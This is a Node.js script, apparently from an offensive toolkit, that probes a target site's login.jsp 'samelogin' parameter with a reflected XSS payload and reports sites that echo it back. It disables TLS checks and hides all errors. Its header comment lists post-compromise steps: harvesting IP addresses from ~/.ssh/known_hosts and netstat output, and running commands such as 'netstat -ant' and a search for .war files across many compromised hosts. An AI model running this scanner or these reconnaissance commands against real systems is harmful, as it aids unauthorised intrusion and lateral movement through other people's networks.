var EventEmitter = require('events').EventEmitter,
	fs = require('fs'),
	request = require('request'),
	program = require('commander'),
	maxSockets = 333,
	timeout = 2000,
	n_maxLs = maxSockets;

EventEmitter.prototype._maxListeners = n_maxLs;
var _fnNull = function(e){if(program && program.verbose)console.log(e)};
process.on('uncaughtException', _fnNull);
process.on('unhandledRejection', _fnNull);

EventEmitter.defaultMaxListeners = n_maxLs;
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";
/**
 *  cat All_netstat.txt|grep -E "[0-9]{3}\."|grep -vE "(127|\(|LISTEN)"|grep -Ev '192.*?192'|grep -v '223'
 * cat ~/.ssh/known_hosts |grep -Eo "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"|sort -u
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'netstat -ant'
 * node tools/doCmdIps.js -f data/Ok1.txt -c 'find . -name "*.war"|grep -Ev "(bea|uudi|wls|wsat|weblogic)"'
 * 
 */
program.version("parse webshell urls 1.0")
			
			.option('-u, --url [value]', 'url')
			.on('--help',function()
			{
				console.log("\n\nnode tools/checkXss.js -u url\n\n");
			})
            .parse(process.argv);
            
// 获取一个包装后的请求对象，包含设置代理后的
	// 优先使用系统环境变量中的代理，如果设置了，则覆盖系统代理
	function fnGetRequest(req,opt)
	{
		var _req = req, s = program && program.proxy || process.env["HTTP_PROXY"] || '',option = 
			{
				agent: false, pool: {maxSockets: 200},
				'timeout':timeout||2000,
				'maxSockets':n_maxLs,
				maxRedirects:10,
				agentOptions: {
			      rejectUnauthorized: false
			    },
				// localAddress:'192.168.24.1',// 指定网卡Local interface to bind for network connections when issuing the request
				rejectUnauthorized:false,
				removeRefererHeader:false,
				followRedirect:true,     // follow HTTP 3xx responses as redirects (default: true).
				followAllRedirects:false,// follow non-GET HTTP 3xx responses as redirects (default: false)
				'headers':{'connection':'close'}
			};
		if(opt)
		{
			for(var k in opt)option[k] = opt[k];
		}
		// process.env["HTTP_PROXY"] = "http://127.0.0.1:8880";
		if(s)option['proxy'] = s,log("当前代理：" + s);
		
		_req = req.defaults(option);
		
		return _req;
	};

if(program.url)
{
	var url = program.url,szOurl = url, req = fnGetRequest(request),  s = "<script>alert(" + new Date().getTime() + ")</script>";
	if(/\/[^\/\.]+$/gmi.test(url))
		url += "/";
	url = url.replace(/\/[^\/]*$/gmi, "/") + "login.jsp?samelogin=" + encodeURIComponent("null\";</script>" + s);
	

	req.get(url,function(e,r,b)
	{
		if(!e && b)
		{
			if(-1 < String(b).indexOf(s))
			{
				console.log("found XSS: " + szOurl);
			}
		}
	});
}